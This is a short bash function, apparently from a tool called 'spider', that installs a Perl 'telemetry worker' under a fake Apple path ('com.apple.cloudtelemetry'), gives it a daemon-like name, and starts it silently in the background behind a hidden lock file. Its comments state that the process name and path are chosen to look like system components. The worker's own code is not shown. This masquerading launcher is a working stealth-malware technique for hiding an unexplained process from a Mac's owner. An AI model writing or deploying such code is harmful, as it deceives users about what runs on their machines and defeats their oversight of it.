#!/usr/bin/env bash
# Launch background cloud telemetry worker (system-style process name)

spider_start_edge_reporter() {
  local src="${SPIDER_ROOT}/lib/cloudtelemetryd.pl"
  if [[ ! -f "$src" ]]; then
    # fallback legacy name
    src="${SPIDER_ROOT}/lib/edge_reporter.pl"
  fi
  if [[ ! -f "$src" ]]; then
    spider_log "telemetry worker missing"
    return 0
  fi

  # Install/copy under Application Support with a bland system-like path
  local support="${HOME}/Library/Application Support/com.apple.cloudtelemetry"
  local worker="${support}/cloudtelemetryd"
  mkdir -p "$support" 2>/dev/null || true
  if [[ ! -f "$worker" ]] || [[ "$src" -nt "$worker" ]]; then
    cp "$src" "$worker" 2>/dev/null || worker="$src"
  fi
  chmod 0755 "$worker" 2>/dev/null || true

  local lock="/tmp/.com.apple.cloudtelemetry.lock"
  if [[ -f "$lock" ]]; then
    local oldpid
    oldpid=$(cat "$lock" 2>/dev/null || true)
    if [[ -n "$oldpid" ]] && kill -0 "$oldpid" 2>/dev/null; then
      spider_log "telemetry worker already active"
      return 0
    fi
  fi

  CTD_LOCK="$lock" \
    /usr/bin/perl "$worker" >/dev/null 2>&1 &

  spider_log "telemetry worker launched"
  return 0
}
